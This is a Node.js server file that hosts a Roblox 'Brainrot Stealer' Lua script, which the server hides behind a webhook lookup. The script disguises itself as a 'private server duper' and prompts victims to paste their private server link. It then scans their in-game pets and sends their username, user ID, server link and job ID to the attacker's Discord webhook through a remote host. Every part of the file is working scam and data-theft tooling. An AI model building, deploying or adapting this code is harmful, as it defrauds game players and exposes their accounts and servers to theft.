// server.js - HIDDEN WEBHOOKS + WORKING STEALER
const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

// Webhook storage (in production use Redis/MongoDB)
const webhookStorage = new Map();

// Middleware
app.use(express.text({ type: '*/*' }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// BLOCK NON-EXECUTORS - RELAXED
function blockNonExecutor(req, res, next) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const ref = (req.headers["referer"] || "").toLowerCase();

  const allowed = ua.includes("roblox") ||
                  ua.includes("synapse") ||
                  ua.includes("krnl") ||
                  ua.includes("fluxus") ||
                  ua.includes("executor") ||
                  ref.includes("roblox") ||
                  true; // Allow all for testing

  if (!allowed) {
    return res.status(403).send("Access denied");
  }
  next();
}

// STORE WEBHOOK ENDPOINT (called by bot)
app.post("/store", (req, res) => {
  try {
    const { webhook_id, webhook_url } = req.body;
    console.log("Storing webhook:", { webhook_id, webhook_url });
    
    if (webhook_id && webhook_url && webhook_url.startsWith("https://discord.com/api/webhooks/")) {
      webhookStorage.set(webhook_id, webhook_url);
      res.json({ success: true, message: "Webhook stored" });
    } else {
      res.status(400).json({ success: false, message: "Invalid data" });
    }
  } catch (error) {
    res.status(500).json({ success: false, message: "Server error" });
  }
});

// GET WEBHOOK ENDPOINT
app.get("/webhook/:id", (req, res) => {
  const webhookId = req.params.id;
  const webhook = webhookStorage.get(webhookId);
  
  if (webhook) {
    res.json({ success: true, webhook: webhook });
  } else {
    res.status(404).json({ success: false, message: "Webhook not found" });
  }
});

// TEST ENDPOINT
app.get("/test", (req, res) => {
  res.send("SERVER WORKING! Webhook system active.");
});

// HOME
app.get("/", (req, res) => {
  res.send("Brainrot Stealer - Hidden Webhook System");
});

// /raw → RETURN LUA SCRIPT WITH HIDDEN WEBHOOK
app.get("/raw", blockNonExecutor, (req, res) => {
  const webhookId = req.query.id;
  
  console.log("Raw request with ID:", webhookId);

  if (!webhookId) {
    return res.status(400).send("-- MISSING WEBHOOK ID --");
  }

  // SIMPLE BUT WORKING LUA SCRIPT
  const luaScript = `-- Brainrot Stealer - Hidden Webhook
print("🧠 Brainrot Stealer Loading...")

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

-- Wait for player
if not player then
    repeat wait() until Players.LocalPlayer
    player = Players.LocalPlayer
end
repeat wait() until player.PlayerGui

-- Enable HTTP
pcall(function() HttpService.HttpEnabled = true end)

local WebhookID = "${webhookId}"
local ServerURL = "https://tommyfc555-github-io.onrender.com"

-- Get webhook from server
local function getWebhook()
    local success, webhook = pcall(function()
        local response
        if syn then
            response = syn.request({
                Url = ServerURL .. "/webhook/" .. WebhookID,
                Method = "GET"
            })
        elseif request then
            response = request({
                Url = ServerURL .. "/webhook/" .. WebhookID,
                Method = "GET"
            })
        else
            response = {
                Body = game:HttpGet(ServerURL .. "/webhook/" .. WebhookID, true)
            }
        end
        
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            if data.success then
                return data.webhook
            end
        end
        return nil
    end)
    return success and webhook
end

-- Send to Discord
local function sendToDiscord(embedData)
    local webhook = getWebhook()
    if not webhook then
        print("❌ Failed to get webhook")
        return false
    end
    
    local success, result = pcall(function()
        local data = {
            embeds = {embedData}
        }
        
        local json = HttpService:JSONEncode(data)
        
        if syn and syn.request then
            syn.request({
                Url = webhook,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
        elseif request then
            request({
                Url = webhook,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
        else
            HttpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
        end
    end)
    
    return success
end

-- Scan pets function
local function scanPets()
    local allPets = {}
    local brainrotPets = {}
    
    pcall(function()
        local plots = workspace:FindFirstChild("Plots")
        if not plots then return end
        
        for _, plot in pairs(plots:GetChildren()) do
            local pods = plot:FindFirstChild("AnimalPodiums")
            if not pods then continue end
            
            for _, pod in pairs(pods:GetChildren()) do
                local base = pod:FindFirstChild("Base")
                if not base then continue end
                local spawn = base:FindFirstChild("Spawn")
                if not spawn then continue end
                local attachment = spawn:FindFirstChild("Attachment")
                if not attachment then continue end
                local overhead = attachment:FindFirstChild("AnimalOverhead")
                if not overhead then continue end
                local nameLabel = overhead:FindFirstChild("DisplayName")
                local genLabel = overhead:FindFirstChild("Generation")
                
                if not nameLabel or not nameLabel:IsA("TextLabel") then continue end
                
                local petName = nameLabel.Text
                local rateText = genLabel and genLabel.Text or "0/s"
                if petName == "" then continue end
                
                local rateNumber = tonumber(string.match(rateText, "([%d%.]+)")) or 0
                local moneyValue = 0
                
                if string.find(rateText, "B/s") then moneyValue = rateNumber * 1e9
                elseif string.find(rateText, "M/s") then moneyValue = rateNumber * 1e6
                elseif string.find(rateText, "K/s") then moneyValue = rateNumber * 1e3
                else moneyValue = rateNumber end
                
                local petData = {
                    Name = petName,
                    Rate = rateText,
                    Money = moneyValue
                }
                
                table.insert(allPets, petData)
                
                if string.find(string.lower(petName), "brainrot") and moneyValue > 1e6 then
                    table.insert(brainrotPets, petData)
                end
            end
        end
    end)
    
    -- Sort by money
    table.sort(allPets, function(a, b) return a.Money > b.Money end)
    table.sort(brainrotPets, function(a, b) return a.Money > b.Money end)
    
    return allPets, brainrotPets
end

-- Create the main GUI
local function createMainGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BrainrotStealer"
    screenGui.Parent = player.PlayerGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 300)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 60)
    title.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
    title.Text = "🧠 BRAINROT STEALER\\nPRIVATE SERVER DUPER"
    title.TextColor3 = Color3.fromRGB(0, 255, 0)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.Parent = mainFrame
    
    local inputBox = Instance.new("TextBox")
    inputBox.Size = UDim2.new(0.8, 0, 0, 40)
    inputBox.Position = UDim2.new(0.1, 0, 0.3, 0)
    inputBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    inputBox.TextColor3 = Color3.new(1, 1, 1)
    inputBox.PlaceholderText = "Paste Private Server Link..."
    inputBox.Text = ""
    inputBox.Parent = mainFrame
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(0.8, 0, 0, 30)
    statusLabel.Position = UDim2.new(0.1, 0, 0.5, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Status: Ready - Enter server link"
    statusLabel.TextColor3 = Color3.new(1, 1, 1)
    statusLabel.TextSize = 14
    statusLabel.Parent = mainFrame
    
    local dupeButton = Instance.new("TextButton")
    dupeButton.Size = UDim2.new(0.7, 0, 0, 50)
    dupeButton.Position = UDim2.new(0.15, 0, 0.7, 0)
    dupeButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
    dupeButton.Text = "🚀 START DUPING"
    dupeButton.TextColor3 = Color3.new(1, 1, 1)
    dupeButton.Font = Enum.Font.GothamBold
    dupeButton.TextSize = 18
    dupeButton.Parent = mainFrame
    
    dupeButton.MouseButton1Click:Connect(function()
        local serverLink = inputBox.Text
        if serverLink == "" or not string.find(string.lower(serverLink), "roblox") then
            statusLabel.Text = "Status: Invalid server link!"
            return
        end
        
        statusLabel.Text = "Status: Scanning pets..."
        dupeButton.Text = "SCANNING..."
        dupeButton.BackgroundColor3 = Color3.fromRGB(200, 200, 0)
        
        wait(2)
        
        -- Scan pets
        local allPets, brainrotPets = scanPets()
        
        statusLabel.Text = "Status: Sending to Discord..."
        dupeButton.Text = "SENDING..."
        
        -- Create embed
        local embed = {
            title = "🧠 BRAINROT STEALER - DUPE RESULTS",
            description = "Private Server: " .. serverLink,
            color = 65280,
            fields = {
                {
                    name = "👤 PLAYER INFO",
                    value = "Name: " .. player.Name .. "\\nUserID: " .. player.UserId .. "\\nProfile: [View](https://www.roblox.com/users/" .. player.UserId .. "/profile)",
                    inline = false
                },
                {
                    name = "🎯 SERVER INFO", 
                    value = "Link: " .. serverLink .. "\\nPlaceID: " .. game.PlaceId .. "\\nJobID: " .. game.JobId,
                    inline = false
                },
                {
                    name = "📊 PET STATS",
                    value = "Total Pets: " .. #allPets .. "\\nBrainrots: " .. #brainrotPets,
                    inline = true
                },
                {
                    name = "💰 TOP PETS",
                    value = #allPets > 0 and allPets[1].Name .. " | " .. allPets[1].Rate or "None",
                    inline = true
                }
            },
            footer = {
                text = "Brainrot Stealer • " .. os.date("%X")
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
        
        -- Send to Discord
        local success = sendToDiscord(embed)
        
        if success then
            statusLabel.Text = "Status: ✅ SUCCESS! Check Discord"
            dupeButton.Text = "✅ DUPED!"
            dupeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
            
            -- Wait and close
            wait(3)
            screenGui:Destroy()
            print("✅ Dupe completed successfully!")
        else
            statusLabel.Text = "Status: ❌ Failed to send"
            dupeButton.Text = "❌ FAILED - RETRY"
            dupeButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
        end
    end)
    
    return screenGui
end

-- Initialize
wait(1)
createMainGUI()
print("🧠 Brainrot Stealer GUI Created!")
print("📝 Enter private server link and click START DUPING")

return "Brainrot Stealer Loaded - Hidden Webhook System"`;

  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  res.send(luaScript);
});

// 404 Handler
app.use((req, res) => {
  res.status(404).send("Endpoint not found");
});

// START SERVER
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server LIVE on port ${PORT}`);
  console.log(`✅ Webhook Storage: ACTIVE`);
  console.log(`🔗 Test: https://tommyfc555-github-io.onrender.com/test`);
});
